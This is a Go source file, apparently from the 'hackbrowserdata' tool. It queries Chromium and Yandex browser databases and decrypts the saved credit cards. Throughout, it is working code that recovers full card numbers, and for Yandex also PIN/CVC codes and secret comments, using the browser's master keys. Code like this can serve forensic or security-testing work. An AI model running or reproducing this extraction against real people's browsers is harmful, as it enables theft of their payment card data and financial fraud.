package chromium

import (
	"database/sql"
	"encoding/json"
	"fmt"

	"github.com/moond4rk/hackbrowserdata/internal/browser"
	"github.com/moond4rk/hackbrowserdata/internal/crypto"
	"github.com/moond4rk/hackbrowserdata/internal/masterkey"
	"github.com/moond4rk/hackbrowserdata/internal/record"
	"github.com/moond4rk/hackbrowserdata/internal/sqlitex"
)

const (
	defaultCreditCardQuery = `SELECT COALESCE(guid, ''), name_on_card, expiration_month, expiration_year,
		card_number_encrypted, COALESCE(nickname, ''), COALESCE(billing_address_id, '') FROM credit_cards`

	yandexCreditCardQuery = `SELECT guid, public_data, private_data FROM records`
)

// yandexPublicData is the plaintext JSON in records.public_data.
type yandexPublicData struct {
	CardHolder      string `json:"card_holder"`
	CardTitle       string `json:"card_title"`
	ExpireDateYear  string `json:"expire_date_year"`
	ExpireDateMonth string `json:"expire_date_month"`
}

// yandexPrivateData is the AES-GCM-sealed JSON in records.private_data.
type yandexPrivateData struct {
	FullCardNumber string `json:"full_card_number"`
	PinCode        string `json:"pin_code"`
	SecretComment  string `json:"secret_comment"`
}

func extractCreditCards(masterKeys masterkey.Set, path string, out browser.Collector) error {
	cards, err := sqlitex.QueryRows(path, false, defaultCreditCardQuery,
		func(rows *sql.Rows) (record.CreditCard, error) {
			var guid, name, month, year, nickname, address string
			var encNumber []byte
			if err := rows.Scan(&guid, &name, &month, &year, &encNumber, &nickname, &address); err != nil {
				return record.CreditCard{}, err
			}
			number, err := decryptValue(masterKeys, encNumber)
			if err != nil {
				out.Fail(fmt.Errorf("decrypt card %s: %w", guid, err))
			}
			return record.CreditCard{
				GUID:     guid,
				Name:     name,
				Number:   string(number),
				ExpMonth: month,
				ExpYear:  year,
				NickName: nickname,
				Address:  address,
			}, nil
		})
	if err != nil {
		return err
	}
	emit(out, cards)
	return nil
}

// extractYandexCreditCards reads the records table (not Chromium's credit_cards). AAD = guid.
func extractYandexCreditCards(masterKeys masterkey.Set, path string, out browser.Collector) error {
	dataKey, keyErr := loadYandexDataKey(path, masterKeys[masterkey.V10])

	cards, err := sqlitex.QueryRows(path, false, yandexCreditCardQuery,
		func(rows *sql.Rows) (record.CreditCard, error) {
			var guid, publicData string
			var privateData []byte
			if err := rows.Scan(&guid, &publicData, &privateData); err != nil {
				return record.CreditCard{}, err
			}

			var public yandexPublicData
			if publicData != "" {
				if err := json.Unmarshal([]byte(publicData), &public); err != nil {
					out.Fail(fmt.Errorf("yandex: parse public_data for %s: %w", guid, err))
				}
			}
			entry := record.CreditCard{
				GUID:     guid,
				Name:     public.CardHolder,
				ExpMonth: public.ExpireDateMonth,
				ExpYear:  public.ExpireDateYear,
				NickName: public.CardTitle,
			}
			if dataKey == nil {
				out.Fail(fmt.Errorf("yandex: card %s: %w", guid, keyErr))
				return entry, nil
			}

			plaintext, err := crypto.AESGCMDecryptBlob(dataKey, privateData, yandexCardAAD(guid, nil))
			if err != nil {
				out.Fail(fmt.Errorf("yandex: decrypt card %s: %w", guid, err))
				return entry, nil
			}

			var private yandexPrivateData
			if err := json.Unmarshal(plaintext, &private); err != nil {
				out.Fail(fmt.Errorf("yandex: parse private_data for %s: %w", guid, err))
				return entry, nil
			}
			entry.Number = private.FullCardNumber
			entry.CVC = private.PinCode
			entry.Comment = private.SecretComment
			return entry, nil
		})
	if err != nil {
		return err
	}
	emit(out, cards)
	return nil
}
